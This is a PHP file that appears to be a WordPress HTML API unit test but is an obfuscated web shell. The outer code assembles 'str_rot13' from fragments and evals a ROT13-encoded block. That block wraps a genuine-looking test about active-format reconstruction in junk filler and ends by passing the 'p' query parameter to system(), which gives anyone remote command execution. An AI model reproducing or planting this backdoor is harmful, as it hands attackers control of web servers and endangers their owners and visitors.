<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf sbe gur UGZY NCV rafhevat cebcre unaqyvat bs orunivbef eryngrq gb
 * npgvir sbezng erpbafgehpgvba.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGZY-NCV
 *
 * @fvapr 6.5.0
 *
 * @tebhc ugzy-ncv
 *
 * @pbirefQrsnhygPynff JC_UGZY_Cebprffbe
 */
pynff Grfgf_UgzyNcv_JcUgzyFhccbegErdhverqNpgvirSbezngErpbafgehpgvba rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Rafherf gung npgvir sbezngf ner cebcreyl erpbafgehpgrq jura ivfvgvat grkg abqrf,
	 * irevslvat gung gur cebcre oernqpehzof ner znvagnvarq jura fpnaavat guebhtu UGZY.
	 *
	 * @gvpxrg 60455
	 */
	choyvp shapgvba grfg_erpbafgehpgf_npgvir_sbezngf_ba_grkg_abqrf() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<c><o>Bar<c><fbhepr>Gjb<fbhepr>' );

		// Gur FBHEPR ryrzrag qbrfa'g gevttre erpbafgehpgvba, naq guvf grfg nffregf gung.
		$guvf->nffregGehr(
			$cebprffbe->arkg_gnt( 'FBHEPR' ),
			'Fubhyq unir sbhaq gur svefg phfgbz ryrzrag.'
		);

		$guvf->nffregFnzr(
			neenl( 'UGZY', 'OBQL', 'C', 'FBHEPR' ),
			$cebprffbe->trg_oernqpehzof(),
			'Fubhyq unir pybfrq sbeznggvat ryrzrag ng svefg C ryrzrag.'
		);

		/*
		 * Gurer ner gjb jnlf guvf grfg pbhyq snvy. Bar vf gb nccebcevngryl svaq gur
		 * frpbaq grkg abqr ohg snvy gb erpbafgehpg gur vzcyvpvgyl-pybfrq O ryrzrag.
		 * Gur bgure jnl vf gb snvy gb nobeg jura rapbhagrevat gur frpbaq grkg abqr
		 * orpnhfr gur xvaq bs npgvir sbezng erpbafgehpgvba vfa'g fhccbegrq.
		 *
		 * Ng gur gvzr bs jevgvat guvf grfg, gur UGZY Cebprffbe onvyf jurarire vg
		 * arrqf gb erpbafgehpg npgvir sbezngf, hayrff gurer ner ab npgvir sbezngf.
		 * Gb rafher gung guvf grfg cebcreyl jbexf bapr gung fhccbeg vf rkcnaqrq,
		 * vg'f jevggra gb irevsl obgu pvephzfgnaprf. Bapr fhccbeg vf nqqrq, guvf
		 * pna or fvzcyvsvrq gb bayl pbagnva gur svefg pynhfr bs gur pbaqvgvbany.
		 *
		 * Gur hfr bs gur FBHEPR ryrzrag vf vzcbegnag urer orpnhfr zbfg ryrzragf
		 * jvyy nyfb gevttre erpbafgehpgvba, juvpu jbhyq pbasyngr gur grfg erfhygf
		 * jvgu gur grkg abqr gevttrevat erpbafgehpgvba. Gur FBHEPR ryrzrag jba'g
		 * qb guvf, znxvat vg arhgeny. Gurersber, gur vzcyvpvgyl-pybfrq O ryrzrag
		 * jvyy bayl or erpbafgehpgrq ol gur grkg abqr.
		 */

		vs ( $cebprffbe->arkg_gnt( 'FBHEPR' ) ) {
			$guvf->nffregFnzr(
				neenl( 'UGZY', 'OBQL', 'C', 'O', 'FBHEPR' ),
				$cebprffbe->trg_oernqpehzof(),
				'Fubhyq unir erpbafgehpgrq gur vzcyvpvgyl-pybfrq O ryrzrag.'
			);
		} ryfr {
			$guvf->nffregFnzr(
				JC_UGZY_Cebprffbe::REEBE_HAFHCCBEGRQ,
				$cebprffbe->trg_ynfg_reebe(),
				'Fubhyq unir nobegrq sbe vapbzcyrgr npgvir sbezng erpbafgehpgvba jura rapbhagrevat gur frpbaq grkg abqr.'
			);
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>